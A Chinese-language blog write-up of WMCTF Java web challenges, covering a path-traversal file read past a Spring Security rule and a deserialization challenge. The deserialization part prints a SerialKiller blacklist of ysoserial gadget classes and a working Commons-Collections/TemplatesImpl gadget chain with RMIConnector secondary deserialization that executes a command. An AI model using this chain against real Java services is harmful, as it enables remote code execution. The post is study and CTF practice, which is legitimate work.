---
layout: post
title: WMCTF中java
categories: [blog ]
tags: [Java,]
description: "当时禁了非常多的类"
image:
  feature: windows.jpg
  credit: Azeril
  creditlink: azeril.com
 


---

![](/img/swirl/11.jpg)

# WMCTF

## AnyFileRead

首先分析AdminController路由

```java
@RequestMapping({"/admin"})
@Controller
/* loaded from: app.jar:BOOT-INF/classes/cc/saferoad/controller/AdminController.class */
public class AdminController {
    @GetMapping({"/*"})
    public String Manage() {
        return "manage";
    }

    @RequestMapping({"/{*path}"})
    @ResponseBody
    public void fileDownload(@PathVariable("path") String path, HttpServletResponse response) throws IOException {
        File file = new File("/tmp/" + path);
        InputStream fis = new BufferedInputStream(new FileInputStream(file));
        byte[] buffer = new byte[fis.available()];
        fis.read(buffer);
        fis.close();
        response.reset();
        response.setCharacterEncoding(UriEscape.DEFAULT_ENCODING);
        response.addHeader(HttpHeaders.CONTENT_DISPOSITION, "attachment;filename=" + URLEncoder.encode(path, UriEscape.DEFAULT_ENCODING));
        response.addHeader(HttpHeaders.CONTENT_LENGTH, "" + file.length());
        OutputStream outputStream = new BufferedOutputStream(response.getOutputStream());
        response.setContentType("application/octet-stream");
        outputStream.write(buffer);
        outputStream.flush();
    }
}
```

Java安全之Spring Security 5.6.3**绕过**

搜了好多文章也试了好多，但都绕不过去 %0a%0d

### 	SpringSecurityConfig

```java
public class SpringSecurityConfig extends WebSecurityConfigurerAdapter {
    @Bean
    public HttpFirewall httpFirewall() {
        return new CustomHttpFirewall();
    }

    @Override // org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter
    protected void configure(HttpSecurity httpSecurity) throws Exception {
        httpSecurity.authorizeRequests().antMatchers("/admin/**").authenticated();
    }
}
```

```java
  protected void configure(StrictHttpFirewall firewalledRequest) {
        firewalledRequest.setAllowUrlEncodedSlash(true);//允许URL路径中使用编码的斜杠
        firewalledRequest.setAllowUrlEncodedDoubleSlash(true);//允许使用双斜杠
        firewalledRequest.setAllowUrlEncodedPeriod(true);//允许URL路径中使用编码的句点
    }

```

![image-20230819174200675](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819174200675.png)

[浅谈SpringSecurity与CVE-2023-22602 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/640655127)

![image-20230819175751028](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819175751028.png)

所以说这道题

path为  ../flag

```
File file = new File("/tmp/" + path);
```

## ez_java_agagin

![image-20230819212638191](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819212638191.png)

扫完目录也就一个DS_store泄露并没什么有用的东西。

但是源码这两个url很奇怪，burp测一下功能

![image-20230819212840640](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819212840640.png)

一个只能读取图片，一个回显

must contain java and not have flag

![image-20230819212907045](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819212907045.png)

![image-20230819215225628](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819215225628.png)

![image-20230819222350800](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819222350800.png)

WMCTF{wowowowoowow_you_can_decode_meeeeee!}

## ez_java_rev

有用的就这一个类(就是有一个xml黑名单)

```java
@WebServlet(name = "CmdServlet", urlPatterns = {"/closetome"})
/* loaded from: Imagefile.class */
public class CmdServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    }

    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String exp = req.getParameter("exp");
        byte[] b = Base64.getDecoder().decode(exp);
        ObjectInputStream ois = null;
        try {
            ois = new SerialKiller(new ByteArrayInputStream(b), "K:\\javafile\\wmctf-web\\src\\main\\resources\\serialkiller.xml");
        } catch (ConfigurationException e) {
            e.printStackTrace();
        }
        try {
            ois.readObject();
        } catch (ClassNotFoundException e2) {
            e2.printStackTrace();
        }
    }
}
```

正好前不久做了一道MRCTF的题差不多，但过滤的少都是用替代类ｆａｃｔｏｒｙ代替

这是我做的题是这样

```javascript
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InvokerTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ChainedTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ConstantTransformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateTransformer$</regexp>
```

这道题的过滤是

```java
 <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
        <regexp>javax\.management\.BadAttributeValueExpException$</regexp>
        <regexp>org\.apache\.commons\.collections\.keyvalue\.TiedMapEntry$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ChainedTransformer$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TrAXFilter$</regexp>
        <regexp>java\.security\.SignedObject$</regexp>
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
```

```java
<config>
    <refresh>6000</refresh>
    <mode>
        <!--  set to 'false' for blocking mode  -->
        <profiling>false</profiling>
    </mode>
    <logging>
        <enabled>false</enabled>
    </logging>
    <blacklist>
        <!--  ysoserial's CommonsCollections1,3,5,6 payload   -->
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
        <regexp>javax\.management\.BadAttributeValueExpException$</regexp>
        <regexp>org\.apache\.commons\.collections\.keyvalue\.TiedMapEntry$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.ChainedTransformer$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TrAXFilter$</regexp>
        <regexp>java\.security\.SignedObject$</regexp>
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
        <!--  ysoserial's CommonsCollections2,4 payload   -->
        <regexp>org\.apache\.commons\.beanutils\.BeanComparator$</regexp>
        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
        <regexp>com\.sun\.rowset\.JdbcRowSetImpl$</regexp>
        <regexp>java\.rmi\.registry\.Registry$</regexp>
        <regexp>java\.rmi\.server\.ObjID$</regexp>
        <regexp>java\.rmi\.server\.RemoteObjectInvocationHandler$</regexp>
        <regexp>org\.springframework\.beans\.factory\.ObjectFactory$</regexp>
        <regexp>org\.springframework\.core\.SerializableTypeWrapper\$MethodInvokeTypeProvider$</regexp>
        <regexp>org\.springframework\.aop\.framework\.AdvisedSupport$</regexp>
        <regexp>org\.springframework\.aop\.target\.SingletonTargetSource$</regexp>
        <regexp>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$</regexp>
        <regexp>org\.springframework\.core\.SerializableTypeWrapper\$TypeProvider$</regexp>
        <regexp>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$</regexp>
        <regexp>java\.util\.PriorityQueue$</regexp>
        <regexp>java\.lang\.reflect\.Proxy$</regexp>
        <regexp>javax\.management\.MBeanServerInvocationHandler$</regexp>
        <regexp>javax\.management\.openmbean\.CompositeDataInvocationHandler$</regexp>
        <regexp>java\.beans\.EventHandler$</regexp>
        <regexp>java\.util\.Comparator$</regexp>
        <regexp>org\.reflections\.Reflections$</regexp>
    </blacklist>
    <whitelist>
        <regexp>.*</regexp>
    </whitelist>
</config>
```

打cc7这条链子的时候，发现只有chainedtransformer被禁了，本来想找它的替代类

但是找了一圈没找到，并且这个类还不能删了。

```java
commons-collections-3.2.1.jar
commons-compress-1.20.jar
commons-configuration-1.10.jar
commons-fileupload-1.4.jar
commons-io-2.5.jar
commons-lang-2.6.jar
commons-lang3-3.12.0.jar
commons-logging-1.2.jar
commons-logging-api-1.1.jar
commons-vfs2-2.0.jar
javassist-3.12.1.GA.jar
junrar-0.7.jar
maven-scm-api-1.4.jar
maven-scm-provider-svn-commons-1.4.jar
maven-scm-provider-svnexe-1.4.jar
plexus-utils-1.5.6.jar
regexp-1.3.jar
serialkiller-0.4.jar
xz-1.9.jar
```

### 赛后复现没有官方的ｗｐ但是在群里的✌说了一句cc7+RMI二次反序列化（整）

这里是用`invokerTransformer触发RMIconnect#connect方法`

接下来的思路就是跟着cc7一步步调试

```java
package com.ctf.help_me;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;



public class cc7 {
    public static void main(String[] args) throws Exception{
       //所以我直接找出cc7触发invoke的地方就可以了

//        Transformer[] transformers = {
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
//                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
//        };
//        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[0]);

//        HashMap<Object, Object> hashMap = new HashMap<>();
//        Map<Object, Object> lazymap1 = LazyMap.decorate(hashMap, new ConstantTransformer(1));
//        lazymap1.put("Aa", "value");
//
//        HashMap<Object, Object> hashMap1 = new HashMap<>();
//        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
//
//        Map lazymap2 = LazyMap.decorate(hashMap1, transformer);
//        lazymap2.put("BB", "value");
//
//        Hashtable<Object, Object> objectObjectHashtable = new Hashtable<>();
//        objectObjectHashtable.put(lazymap1, 1);
//        objectObjectHashtable.put(lazymap2, 2);
//
//        lazymap2.remove("Aa");
//
//        Class<ChainedTransformer> chainedTransformerClass = ChainedTransformer.class;
//        Field iTransformers = chainedTransformerClass.getDeclaredField("iTransformers");
//        iTransformers.setAccessible(true);
//        iTransformers.set(transformer, transformer);
//
//        serialize(objectObjectHashtable);
//        unserialize("ser.bin");



        ByteArrayOutputStream tser = new ByteArrayOutputStream();
        ObjectOutputStream toser = new ObjectOutputStream(tser);
        toser.writeObject(getObject());
        toser.close();
        String exp= Base64.getEncoder().encodeToString(tser.toByteArray());
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/"+exp);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);
        invokerTransformer.transform(rmiConnector);




        ///  public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        //        super();
        //        iMethodName = methodName;
        //        iParamTypes = paramTypes;
        //        iArgs = args;
        //    }
//        public Object transform(Object input) {
//            if (input == null) {
//                return null;
//            }
//            try {
//                Class cls = input.getClass();
//                Method method = cls.getMethod(iMethodName, iParamTypes);
//                return method.invoke(input, iArgs);
     //   invokerTransformer.transform()




    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        return objectInputStream.readObject();
    }
    public static void setFieldValue(Object obj,String filename,Object newobj) throws NoSuchFieldException, IllegalAccessException {
        Field declaredField = obj.getClass().getDeclaredField(filename);
        declaredField.setAccessible(true);
        declaredField.set(obj,newobj);
    }
    public static byte[] getbyte() throws NotFoundException, CannotCompileException, IOException, javassist.NotFoundException {
        ClassPool classPool=new ClassPool(true);
        CtClass helloAbstract = classPool.makeClass("hello");
        CtClass ctClass = classPool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        helloAbstract.setSuperclass(ctClass);
        CtConstructor constructor=new CtConstructor(new CtClass[]{},helloAbstract);
        constructor.setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        //java.lang.Runtime.getRuntime().exec("calc");
        helloAbstract.addConstructor(constructor);
        byte[] bytes=helloAbstract.toBytecode();
        helloAbstract.detach();
        return bytes;

    }

    public static HashMap getObject() throws Exception{
        byte [] evilbtes=getbyte();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{evilbtes});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, obj);


        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "test");
        lazyMap.remove(obj);

        setFieldValue(lazyMap,"factory", transformer);

        return expMap;
    }
}
```

![image-20230910105232830](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910105232830.png)

### 找谁调用了`transform `   （lazymap#get)

发现lazymap还没被过滤，那就用它

```java
 ByteArrayOutputStream tser = new ByteArrayOutputStream();
        ObjectOutputStream toser = new ObjectOutputStream(tser);
        toser.writeObject(getObject());
        toser.close();
        String exp= Base64.getEncoder().encodeToString(tser.toByteArray());
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/"+exp);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);
       // invokerTransformer.transform(rmiConnector);

        Map decorate = LazyMap.decorate(new HashMap(), invokerTransformer);
        decorate.get(rmiConnector);
```

### 继续找谁调用了lazymap（CC7使用了新的链Hashtable来触发lazyMap利用链）

此处进行详细分析

Hashtable有一个Entry<?,?>[]类型的table属性，并且还是一个数组，用于存放键值对。Hashtable在序列化时会把table数组的容量写入到序列化流中，再写入table数组中的元素个数，然后把table数组中的元素取出写入到序列化流中。

```java
    private void writeObject(java.io.ObjectOutputStream s) throws IOException {
		//临时变量（栈）
        Entry<Object, Object> entryStack = null;
 
        synchronized (this) {
            s.defaultWriteObject();
 
			//写入table的容量
            s.writeInt(table.length);
			//写入table的元素个数
            s.writeInt(count);
 
            //取出table中的元素，放入栈中（entryStack）
            for (int index = 0; index < table.length; index++) {
                Entry<?,?> entry = table[index];
 
                while (entry != null) {
                    entryStack =
                        new Entry<>(0, entry.key, entry.value, entryStack);
                    entry = entry.next;
                }
            }
        }
 
        //依次写入栈中的每个元素
        while (entryStack != null) {
            s.writeObject(entryStack.key);
            s.writeObject(entryStack.value);
            entryStack = entryStack.next;
        }
    }
```

再根据计算得到的length来创建table数组（origlength 和elements可以决定table数组的大小），然后从反序列化流中依次读取每个元素，然后调用reconstitutionPut方法将元素重新放入table数组（Hashtable的table属性），最终完成反序列化。

```java
	private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
        // Read in the length, threshold, and loadfactor
        s.defaultReadObject();
 
        // 读取table数组的容量
        int origlength = s.readInt();
		//读取table数组的元素个数
        int elements = s.readInt();
 
		//计算table数组的length
        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        if (origlength > 0 && length > origlength)
            length = origlength;
		//根据length创建table数组
        table = new Entry<?,?>[length];
        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;
 
		//反序列化，还原table数组
        for (; elements > 0; elements--) {
            @SuppressWarnings("unchecked")
                K key = (K)s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V)s.readObject();
            reconstitutionPut(table, key, value);
        }
    }
```

`重要的是reconstitutionPut这个方法`

只能大概分析出hashtable不允许数组重复，(var6.hash == var4 && var6.key.equals(var2))

只不过需要满足前面 键的hash值相同，然后后面就相等于  var6.key.equals(var2)      lazymap.equals(var2)

```java
    private void reconstitutionPut(Entry<?, ?>[] var1, K var2, V var3) throws StreamCorruptedException {
        if (var3 == null) {
            throw new StreamCorruptedException();
        } else {
            int var4 = var2.hashCode();
            int var5 = (var4 & Integer.MAX_VALUE) % var1.length;

            Entry var6;
            for(var6 = var1[var5]; var6 != null; var6 = var6.next) {
                if (var6.hash == var4 && var6.key.equals(var2)) {
                    throw new StreamCorruptedException();
                }
            }

            var6 = var1[var5];
            var1[var5] = new Entry(var4, var2, var3, var6);
            ++this.count;
        }
    }
```

但是自己调试发现没用chainedtransformer根本调不到

`出于好奇，问了问✌，之说换个调用get的方法`

为啥调用不到

![image-20230910155922671](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910155922671.png)

![image-20230910160548433](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910160548433.png)

![image-20230910160555390](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910160555390.png)

![image-20230910160603849](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910160603849.png)



![image-20230910160613511](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910160613511.png)

前面需要hashtable那个key的hash相同，如果这样的话传入lazymap.get(这里面就是那个hash key)

比如就是下面这个 Aa和BB的hash相同，但是我们计划传入的是Rmiconnect这个对象，但是对象怎么可能hash相同

![image-20230910160901109](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230910160901109.png)





















